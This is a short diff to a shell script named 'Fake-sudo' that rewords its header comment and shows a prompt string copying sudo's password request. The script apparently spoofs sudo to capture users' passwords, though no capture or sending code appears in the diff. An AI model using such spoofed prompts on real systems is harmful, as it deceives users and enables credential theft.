@@ -2,8 +2,8 @@
 #
 # Fake-sudo
 #
-# This program creates a fake "sudo" 
-# command by defining an alias.
+# This program imitates the behavior 
+# of the "sudo" command.
 #
 
 readonly INPUT_MESSAGE="[sudo] password for ${USER}: "
